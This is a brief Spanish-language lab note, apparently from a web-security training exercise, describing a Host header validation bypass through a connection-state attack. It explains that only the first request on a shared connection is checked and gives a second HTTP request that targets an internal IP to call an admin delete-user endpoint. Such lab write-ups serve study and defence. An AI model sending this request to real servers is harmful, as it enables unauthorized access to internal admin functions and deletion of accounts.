---
title: "6 - Host validation bypass via connection state attack"
---

# 6 - Host validation bypass via connection state attack

Cuando enviamos dos request en la misma conexión `Send Group : single connection`

Solo se valida el host de la primera, entonces en la primera petición ponemos el host válido y en la segunda :

```http
GET /admin/delete?csrf=waCvpZJQxEGBwRXNSbAnManxozXspsSC&username=carlos HTTP/1.1
Host: 192.168.0.1
```
